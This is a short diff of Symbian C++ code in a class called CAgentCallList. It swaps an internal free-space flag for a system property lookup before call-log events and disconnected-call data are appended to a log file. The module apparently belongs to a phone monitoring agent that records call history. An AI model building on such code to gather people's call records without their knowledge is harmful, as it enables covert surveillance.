@@ -124,28 +124,6 @@ void CAgentCallList::StopAgentCmdL()
 	CloseLogL(); 
 	}
 
-void CAgentCallList::NotifyAgentCmdL(TUint32 aData)
-	{
-	TInt notifyType = aData & 0x000000ff;
-	switch(notifyType)
-		{
-		case ENotifyThreshold:
-			{
-			TInt value = (aData & 0x0000ff00);
-			if (value == EBelow)
-				{
-				iBelowFreespaceQuota = ETrue;
-				}
-			else
-				{
-				iBelowFreespaceQuota = EFalse;
-				}
-			}
-			break;
-		default:
-			break;
-		}
-	}
 
 
 /*
@@ -156,7 +134,10 @@ void CAgentCallList::HandleCallLogEventL(TInt aDirection,const CLogEvent& aEvent
 	TTime time = aEvent.Time();
 	if(iTimestamp < time)
 		{
-		if(!iBelowFreespaceQuota)
+		TInt value;
+		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+							
+		if(value)
 			{
 			HBufC8* buf = GetCallLogBufferL(aDirection, aEvent);
 			if (buf->Length() > 0)
@@ -369,7 +350,10 @@ void CAgentCallList::NotifyDisconnectingCallStatusL(CTelephony::TCallDirection a
 	CleanupStack::PushL(buf);
 	if (buf->Length() > 0)
 		{
-		if(!iBelowFreespaceQuota)
+		TInt value;
+		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+							
+		if(value)
 			{
 			// dump the buffer to the file log. 
 			AppendLogL(*buf);
